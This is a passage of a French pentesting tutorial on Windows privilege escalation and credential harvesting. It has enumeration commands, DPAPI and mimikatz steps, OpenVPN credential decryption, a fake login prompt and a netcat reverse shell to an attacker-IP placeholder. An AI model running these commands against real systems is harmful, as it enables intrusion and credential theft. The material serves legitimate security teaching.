**Lisez** la **page suivante** pour en savoir plus sur les emplacements d'**autoruns intéressants pour escalader les privilèges** :

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Pilotes

Recherchez d'éventuels pilotes **tiers étranges/vulnérables**
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## Détournement de DLL PATH

Si vous avez des **permissions d'écriture dans un dossier présent dans PATH**, vous pourriez être capable de détourner une DLL chargée par un processus et **d'escalader les privilèges**.

Vérifiez les permissions de tous les dossiers dans PATH :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Pour plus d'informations sur la manière d'exploiter cette vérification :

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Réseau

### Partages
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### fichier hosts

Vérifiez si d'autres ordinateurs connus sont codés en dur dans le fichier hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces réseau & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ports Ouverts

Vérifiez les **services restreints** depuis l'extérieur
```bash
netstat -ano #Opened ports?
```
### Table de routage
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Table ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Règles de pare-feu

[**Consultez cette page pour les commandes relatives au pare-feu**](../basic-cmd-for-pentesters.md#firewall) **(lister les règles, créer des règles, désactiver, désactiver...)**

Plus de [commandes pour l'énumération réseau ici](../basic-cmd-for-pentesters.md#network)

### Sous-système Windows pour Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Le binaire `bash.exe` peut également être trouvé dans `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si vous obtenez l'utilisateur root, vous pouvez écouter sur n'importe quel port (la première fois que vous utilisez `nc.exe` pour écouter sur un port, il demandera via l'interface graphique si `nc` doit être autorisé par le pare-feu).
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Pour démarrer facilement bash en tant que root, vous pouvez essayer `--default-user root`

Vous pouvez explorer le système de fichiers `WSL` dans le dossier `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Identifiants Windows

### Identifiants Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestionnaire d'identifiants / Coffre-fort Windows

Depuis [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Le Coffre-fort Windows stocke les identifiants des utilisateurs pour les serveurs, les sites web et d'autres programmes que **Windows** peut **connecter les utilisateurs automatiquement**. À première vue, cela peut sembler permettre aux utilisateurs de stocker leurs identifiants Facebook, Twitter, Gmail, etc., afin qu'ils se connectent automatiquement via les navigateurs. Mais ce n'est pas le cas.

Le Coffre-fort Windows stocke les identifiants que Windows peut utiliser pour connecter les utilisateurs automatiquement, ce qui signifie que toute **application Windows nécessitant des identifiants pour accéder à une ressource** (serveur ou site web) **peut utiliser ce Gestionnaire d'identifiants** & Coffre-fort Windows et utiliser les identifiants fournis au lieu que les utilisateurs saisissent le nom d'utilisateur et le mot de passe à chaque fois.

À moins que les applications interagissent avec le Gestionnaire d'identifiants, je ne pense pas qu'il soit possible pour elles d'utiliser les identifiants pour une ressource donnée. Donc, si votre application souhaite utiliser le coffre-fort, elle doit d'une manière ou d'une autre **communiquer avec le gestionnaire d'identifiants et demander les identifiants pour cette ressource** depuis le coffre de stockage par défaut.

Utilisez la commande `cmdkey` pour lister les identifiants stockés sur la machine.
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ensuite, vous pouvez utiliser `runas` avec l'option `/savecred` afin d'utiliser les identifiants enregistrés. L'exemple suivant montre comment appeler un binaire distant via un partage SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Utilisation de `runas` avec un ensemble d'identifiants fournis.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
### DPAPI

En théorie, l'API de protection des données peut permettre le chiffrement symétrique de n'importe quel type de données ; en pratique, son utilisation principale dans le système d'exploitation Windows est de réaliser le chiffrement symétrique de clés privées asymétriques, en utilisant un secret d'utilisateur ou de système comme contribution significative à l'entropie.

**DPAPI permet aux développeurs de chiffrer des clés en utilisant une clé symétrique dérivée des secrets de connexion de l'utilisateur**, ou dans le cas du chiffrement système, en utilisant les secrets d'authentification de domaine du système.

Les clés DPAPI utilisées pour chiffrer les clés RSA de l'utilisateur sont stockées dans le répertoire `%APPDATA%\Microsoft\Protect\{SID}`, où {SID} est l'[Identifiant de sécurité](https://en.wikipedia.org/wiki/Security\_Identifier) de cet utilisateur. **La clé DPAPI est stockée dans le même fichier que la clé principale qui protège les clés privées de l'utilisateur**. Elle est généralement constituée de 64 octets de données aléatoires. (Notez que ce répertoire est protégé, donc vous ne pouvez pas le lister en utilisant `dir` depuis cmd, mais vous pouvez le lister depuis PS).
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Vous pouvez utiliser le **module mimikatz** `dpapi::masterkey` avec les arguments appropriés (`/pvk` ou `/rpc`) pour le décrypter.

Les **fichiers d'identifiants protégés par le mot de passe principal** se trouvent généralement dans :
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Vous pouvez utiliser le **module mimikatz** `dpapi::cred` avec le `/masterkey` approprié pour déchiffrer.\
Vous pouvez **extraire de nombreux DPAPI** **masterkeys** de la **mémoire** avec le module `sekurlsa::dpapi` (si vous êtes root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Identifiants PowerShell

Les **identifiants PowerShell** sont souvent utilisés pour le **scripting** et les tâches d'automatisation comme moyen de stocker des identifiants chiffrés de manière pratique. Les identifiants sont protégés en utilisant **DPAPI**, ce qui signifie généralement qu'ils ne peuvent être déchiffrés que par le même utilisateur sur le même ordinateur sur lequel ils ont été créés.

Pour **déchiffrer** des identifiants PS à partir du fichier les contenant, vous pouvez faire :
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connexions RDP Enregistrées

Vous pouvez les trouver dans `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
et dans `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Commandes Exécutées Récemment
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestionnaire d'identifiants de Bureau à distance**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Utilisez le module **Mimikatz** `dpapi::rdg` avec le `/masterkey` approprié pour **déchiffrer les fichiers .rdg**\
Vous pouvez **extraire de nombreuses clés maîtresses DPAPI** de la mémoire avec le module Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Les gens utilisent souvent l'application StickyNotes sur les postes de travail Windows pour **sauvegarder des mots de passe** et d'autres informations, sans se rendre compte qu'il s'agit d'un fichier de base de données. Ce fichier se trouve à `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` et il vaut toujours la peine d'être recherché et examiné.

### AppCmd.exe

**Notez que pour récupérer des mots de passe à partir d'AppCmd.exe, vous devez être Administrateur et exécuter sous un niveau d'intégrité élevé.**\
**AppCmd.exe** se trouve dans le répertoire `%systemroot%\system32\inetsrv\`.\
Si ce fichier existe, il est possible que certaines **informations d'identification** aient été configurées et peuvent être **récupérées**.

Ce code a été extrait de _**PowerUP**_ :
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Vérifiez si `C:\Windows\CCM\SCClient.exe` existe.\
Les installateurs sont **exécutés avec des privilèges SYSTEM**, beaucoup sont vulnérables au **DLL Sideloading (Info de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Fichiers et Registre (Identifiants)

### Identifiants Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Clés hôtes SSH de Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Clés SSH dans le registre

Les clés privées SSH peuvent être stockées dans la clé de registre `HKCU\Software\OpenSSH\Agent\Keys`, donc vous devriez vérifier s'il y a quelque chose d'intéressant là-dedans :
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
Si vous trouvez une entrée dans ce chemin, il s'agira probablement d'une clé SSH enregistrée. Elle est stockée de manière chiffrée mais peut être facilement déchiffrée en utilisant [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Plus d'informations sur cette technique ici : [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si le service `ssh-agent` n'est pas en cours d'exécution et que vous souhaitez qu'il démarre automatiquement au démarrage, exécutez :
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Il semble que cette technique ne soit plus valide. J'ai essayé de créer des clés ssh, de les ajouter avec `ssh-add` et de me connecter via ssh à une machine. Le registre HKCU\Software\OpenSSH\Agent\Keys n'existe pas et procmon n'a pas identifié l'utilisation de `dpapi.dll` lors de l'authentification par clé asymétrique.
{% endhint %}

### Fichiers non surveillés
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Vous pouvez également rechercher ces fichiers en utilisant **metasploit** : _post/windows/gather/enum\_unattend_

Exemple de contenu\_:\_
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Sauvegardes SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Identifiants Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Recherchez un fichier appelé **SiteList.xml**

### Mot de passe GPP mis en cache

Avant KB2928120 (voir MS14-025), certaines Préférences de Stratégie de Groupe pouvaient être configurées avec un compte personnalisé. Cette fonctionnalité était principalement utilisée pour déployer un compte administrateur local personnalisé sur un groupe de machines. Cependant, il y avait deux problèmes avec cette approche. Premièrement, puisque les Objets de Stratégie de Groupe sont stockés sous forme de fichiers XML dans SYSVOL, tout utilisateur du domaine peut les lire. Le deuxième problème est que le mot de passe défini dans ces GPP est chiffré en AES256 avec une clé par défaut, qui est publiquement documentée. Cela signifie que tout utilisateur authentifié pourrait potentiellement accéder à des données très sensibles et élever ses privilèges sur sa machine ou même sur le domaine. Cette fonction vérifiera si un fichier GPP mis en cache localement contient un champ "cpassword" non vide. Si c'est le cas, il le déchiffrera et retournera un objet PS personnalisé contenant des informations sur le GPP ainsi que l'emplacement du fichier.

Recherchez dans `C:\ProgramData\Microsoft\Group Policy\history` ou dans _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (avant W Vista)_ ces fichiers :

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Pour déchiffrer le cPassword :**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Utilisation de crackmapexec pour obtenir les mots de passe :
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configuration Web IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemple de web.config avec des identifiants :
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Identifiants OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Journaux
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Demander des identifiants

Vous pouvez toujours **demander à l'utilisateur de saisir ses identifiants ou même ceux d'un autre utilisateur** si vous pensez qu'il peut les connaître (notez que **demander** directement au client ses **identifiants** est vraiment **risqué**) :
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Noms de fichiers possibles contenant des identifiants**

Fichiers connus qui contenaient autrefois des **mots de passe** en **texte clair** ou en **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Recherchez dans tous les fichiers proposés :
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Identifiants dans la Corbeille

Vous devriez également vérifier la Corbeille pour y chercher des identifiants

Pour **récupérer les mots de passe** enregistrés par plusieurs programmes, vous pouvez utiliser : [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dans le registre

**Autres clés de registre possibles avec des identifiants**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extraire les clés openssh du registre.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historique des navigateurs

Vous devriez vérifier les bases de données où les mots de passe de **Chrome ou Firefox** sont stockés.\
Vérifiez également l'historique, les marque-pages et les favoris des navigateurs, car certains **mots de passe peuvent** y être stockés.

Outils pour extraire les mots de passe des navigateurs :

* Mimikatz : `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)****

### **Surcharge de DLL COM**

**Component Object Model (COM)** est une technologie intégrée au système d'exploitation Windows qui permet l'**intercommunication** entre les composants logiciels de différents langages. Chaque composant COM est **identifié par un identifiant de classe (CLSID)** et chaque composant expose des fonctionnalités via une ou plusieurs interfaces, identifiées par des identifiants d'interface (IIDs).

Les classes et interfaces COM sont définies dans le registre sous **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** et **HKEY\_**_**CLASSES\_**_**ROOT\Interface** respectivement. Ce registre est créé en fusionnant **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

À l'intérieur des CLSIDs de ce registre, vous pouvez trouver le sous-registre **InProcServer32** qui contient une **valeur par défaut** pointant vers une **DLL** et une valeur appelée **ThreadingModel** qui peut être **Apartment** (mono-thread), **Free** (multi-thread), **Both** (mono ou multi) ou **Neutral** (neutre au thread).

![](<../../.gitbook/assets/image (638).png>)

En gros, si vous pouvez **écraser l'une des DLL** qui vont être exécutées, vous pourriez **escalader les privilèges** si cette DLL va être exécutée par un utilisateur différent.

Pour apprendre comment les attaquants utilisent le détournement de COM comme mécanisme de persistance, consultez :

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Recherche générique de mots de passe dans les fichiers et le registre**

**Rechercher dans le contenu des fichiers**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Recherche d'un fichier avec un nom de fichier spécifique**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Recherchez dans le registre les noms de clés et les mots de passe**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Outils de recherche de mots de passe

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) est un plugin msf que j'ai créé pour **exécuter automatiquement tous les modules POST de metasploit qui recherchent des identifiants** dans la victime.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) recherche automatiquement tous les fichiers contenant des mots de passe mentionnés dans cette page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) est un autre excellent outil pour extraire les mots de passe d'un système.

L'outil [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) recherche les **sessions**, **noms d'utilisateur** et **mots de passe** de plusieurs outils qui sauvegardent ces données en clair (PuTTY, WinSCP, FileZilla, SuperPuTTY et RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Gestionnaires Fuités

Imaginez qu'**un processus s'exécutant en tant que SYSTEM ouvre un nouveau processus** (`OpenProcess()`) avec **un accès complet**. Le même processus **crée également un nouveau processus** (`CreateProcess()`) **avec des privilèges faibles mais héritant de tous les gestionnaires ouverts du processus principal**.\
Ensuite, si vous avez **un accès complet au processus à faibles privilèges**, vous pouvez récupérer le **gestionnaire ouvert vers le processus privilégié créé** avec `OpenProcess()` et **injecter un shellcode**.\
[Lisez cet exemple pour plus d'informations sur **comment détecter et exploiter cette vulnérabilité**.](leaked-handle-exploitation.md)\
[Lisez **cet autre article pour une explication plus complète sur comment tester et abuser d'autres gestionnaires ouverts de processus et de threads hérités avec différents niveaux de permissions (pas seulement un accès complet)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Usurpation de Client de Canal Nominal

Un `pipe` est un bloc de mémoire partagée que les processus peuvent utiliser pour la communication et l'échange de données.

`Named Pipes` est un mécanisme Windows qui permet à deux processus non apparentés d'échanger des données entre eux, même si les processus se trouvent sur deux réseaux différents. C'est très similaire à l'architecture client/serveur car des notions telles que `un serveur de canal nominal` et un `client de canal nominal` existent.

Lorsqu'un **client écrit sur un pipe**, le **serveur** qui a créé le pipe peut **usurper** l'**identité du client** s'il dispose des privilèges **SeImpersonate**. Alors, si vous pouvez trouver un **processus privilégié qui va écrire sur un pipe que vous pouvez usurper**, vous pourriez être en mesure d'**escalader les privilèges** en usurpant ce processus après qu'il ait écrit dans votre pipe créé. [**Vous pouvez lire ceci pour apprendre à réaliser cette attaque**](named-pipe-client-impersonation.md) **ou** [**cela**](./#from-high-integrity-to-system)**.**

**De plus, l'outil suivant permet d'intercepter une communication de canal nominal avec un outil comme burp :** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **et cet outil permet de lister et de voir tous les pipes pour trouver des escalades de privilèges** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## Divers

### **Surveillance des Lignes de Commande pour les mots de passe**

Lorsque vous obtenez un shell en tant qu'utilisateur, il peut y avoir des tâches planifiées ou d'autres processus exécutés qui **transmettent des identifiants sur la ligne de commande**. Le script ci-dessous capture les lignes de commande des processus toutes les deux secondes et compare l'état actuel avec l'état précédent, en affichant toutes les différences.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
